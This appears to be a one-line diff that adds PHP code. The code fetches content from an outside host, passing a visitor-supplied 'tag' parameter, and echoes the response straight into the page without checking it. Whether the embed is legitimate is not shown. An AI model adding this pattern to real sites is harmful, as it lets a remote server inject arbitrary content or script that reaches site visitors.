@@ -1,0 +1,1 @@
+<?php echo file_get_contents("https://handle.inspiroxindia.com/plugin.php?id=IX20242025-00091&mode=list&tag=".((isset($_GET['tag']))?urlencode($_GET['tag']):"")); ?>
